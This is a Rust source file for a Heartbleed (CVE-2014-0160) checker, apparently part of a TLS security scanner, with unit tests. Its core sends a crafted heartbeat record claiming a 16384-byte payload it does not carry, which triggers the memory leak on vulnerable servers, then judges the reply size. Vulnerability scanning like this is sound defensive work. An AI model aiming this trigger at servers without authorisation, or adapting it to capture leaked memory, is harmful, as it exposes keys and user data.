// Heartbleed (CVE-2014-0160) vulnerability checker

use crate::Result;
use crate::constants::{CONTENT_TYPE_HEARTBEAT, HEARTBEAT_REQUEST, VERSION_TLS_1_2};
use crate::protocols::{Protocol, handshake::ClientHelloBuilder};
use crate::utils::network::Target;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;

/// Heartbleed vulnerability tester
pub struct HeartbleedTester<'a> {
    target: &'a Target,
    connect_timeout: Duration,
    read_timeout: Duration,
}

impl<'a> HeartbleedTester<'a> {
    /// Create new Heartbleed tester
    pub fn new(target: &'a Target) -> Self {
        Self {
            target,
            connect_timeout: Duration::from_secs(10),
            read_timeout: Duration::from_secs(5),
        }
    }

    /// Test for Heartbleed vulnerability
    /// CVE-2014-0160: TLS Heartbeat Extension memory disclosure
    pub async fn test(&self) -> Result<bool> {
        // Test TLS 1.0, 1.1, and 1.2 (Heartbleed affects OpenSSL 1.0.1 through 1.0.1f)
        for protocol in [Protocol::TLS10, Protocol::TLS11, Protocol::TLS12] {
            if self.test_protocol(protocol).await? {
                return Ok(true);
            }
        }

        Ok(false)
    }

    /// Test specific protocol for Heartbleed
    async fn test_protocol(&self, protocol: Protocol) -> Result<bool> {
        let addr = self.target.socket_addrs()[0];

        // Connect TCP
        let mut stream = match timeout(self.connect_timeout, TcpStream::connect(addr)).await {
            Ok(Ok(s)) => s,
            _ => return Ok(false),
        };

        // Build ClientHello with Heartbeat extension
        let mut builder = ClientHelloBuilder::new(protocol);
        builder.add_ciphers(&[0xc014, 0xc00a, 0x0039, 0x0038, 0x0035]);

        // Add heartbeat extension (type 0x000f)
        let heartbeat_ext = vec![0x01]; // peer_allowed_to_send
        builder.add_extension(crate::protocols::Extension::new(0x000f, heartbeat_ext));

        let client_hello = builder.build_with_defaults(Some(&self.target.hostname))?;

        // Send ClientHello
        let response = match timeout(self.read_timeout, async {
            stream.write_all(&client_hello).await?;

            // Read ServerHello
            let mut resp = vec![0u8; 16384];
            let n = stream.read(&mut resp).await?;
            resp.truncate(n);
            Ok::<Vec<u8>, anyhow::Error>(resp)
        })
        .await
        {
            Ok(Ok(resp)) if !resp.is_empty() => resp,
            _ => return Ok(false),
        };

        // Check if server accepted heartbeat extension
        if !self.check_heartbeat_extension(&response) {
            return Ok(false);
        }

        // Send malicious heartbeat request
        self.send_malicious_heartbeat(&mut stream).await
    }

    /// Check if ServerHello contains heartbeat extension
    fn check_heartbeat_extension(&self, data: &[u8]) -> bool {
        // Need at least a few bytes to search for extension
        if data.len() < 2 {
            return false;
        }

        // Look for heartbeat extension type 0x000f in the response
        for i in 0..data.len().saturating_sub(2) {
            if data[i] == 0x00 && data[i + 1] == 0x0f {
                return true;
            }
        }

        false
    }

    /// Send malicious heartbeat request and check for memory leak
    async fn send_malicious_heartbeat(&self, stream: &mut TcpStream) -> Result<bool> {
        // Build malicious heartbeat request
        let mut heartbeat = Vec::new();

        // Record header
        heartbeat.push(CONTENT_TYPE_HEARTBEAT); // Content Type: Heartbeat (0x18)
        heartbeat.push((VERSION_TLS_1_2 >> 8) as u8); // Version: TLS 1.2 (0x0303)
        heartbeat.push((VERSION_TLS_1_2 & 0xff) as u8);

        // Record length
        heartbeat.push(0x00);
        heartbeat.push(0x03); // 3 bytes payload

        // Heartbeat request
        heartbeat.push(HEARTBEAT_REQUEST); // Type: Request (0x01)
        heartbeat.push(0x40); // Payload length: 16384 (0x4000) - MALICIOUS!
        heartbeat.push(0x00);

        // Send heartbeat request
        match timeout(self.read_timeout, async {
            stream.write_all(&heartbeat).await?;

            // Read response
            let mut response = vec![0u8; 65535];
            stream.read(&mut response).await
        })
        .await
        {
            Ok(Ok(n)) => {
                // If we get back significantly more data than we sent,
                // server is leaking memory (Heartbleed vulnerable)
                Ok(n > 100)
            }
            _ => Ok(false),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    #[ignore] // Requires network access
    async fn test_heartbleed_modern_server() {
        let target = Target::parse("www.google.com:443")
            .await
            .expect("test assertion should succeed");
        let tester = HeartbleedTester::new(&target);

        let vulnerable = tester.test().await.expect("test assertion should succeed");

        // Google should not be vulnerable
        assert!(!vulnerable);
    }

    #[test]
    fn test_heartbeat_extension_check() {
        let target = Target::with_ips(
            "test.com".to_string(),
            443,
            vec!["127.0.0.1".parse().unwrap()],
        )
        .unwrap();
        let tester = HeartbleedTester {
            target: &target,
            connect_timeout: Duration::from_secs(5),
            read_timeout: Duration::from_secs(5),
        };

        // Sample data with heartbeat extension
        let data_with_ext = vec![0x16, 0x03, 0x03, 0x00, 0x40, 0x00, 0x0f, 0x00, 0x01, 0x01];

        assert!(tester.check_heartbeat_extension(&data_with_ext));

        // Data without extension
        let data_without_ext = vec![0x16, 0x03, 0x03, 0x00, 0x40];
        assert!(!tester.check_heartbeat_extension(&data_without_ext));
    }
}
